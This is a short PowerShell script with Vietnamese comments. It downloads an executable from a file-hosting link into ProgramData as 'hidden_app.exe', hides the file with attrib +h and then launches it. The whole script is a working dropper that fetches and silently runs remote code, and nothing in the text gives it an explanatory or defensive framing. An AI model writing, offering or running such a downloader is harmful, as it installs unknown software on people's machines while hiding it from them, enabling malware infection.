$destination = "$env:ProgramData\hidden_app.exe"
$url = "https://phs7.krakencloud.net/force-download/OTY1MmE3NjQxYWViMTI2ZdbhtB8KbPXYGk8w9A5noVJkUJ7h4ixdaZH-CcjEJGrV/nSJ79opUqU"

# Tải file từ URL về ProgramData
Invoke-WebRequest -Uri $url -OutFile $destination

# Ẩn file
attrib +h $destination

# Chạy file
Start-Process -FilePath $destination
